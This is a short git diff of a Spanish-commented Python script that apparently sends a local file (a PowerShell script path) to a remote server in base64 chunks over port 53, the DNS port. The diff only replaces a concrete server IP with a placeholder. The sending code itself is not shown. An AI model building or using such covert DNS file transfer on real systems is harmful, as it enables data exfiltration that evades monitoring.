@@ -3,7 +3,7 @@ import base64
 import os
 
 # ---------------- CONFIGURACIÓN ----------------
-SERVER_IP = "31.97.185.189"            
+SERVER_IP = "XXX.XXX.XXX.XXX"            
 SERVER_PORT = 53                        
 FILENAME = r"C:\Users\T0279742\Documents\hello.ps1" 
 CHUNK_SIZE = 45                         
@@ -69,3 +69,4 @@ def enviar_archivo():
 
 if __name__ == "__main__":
     enviar_archivo()
+
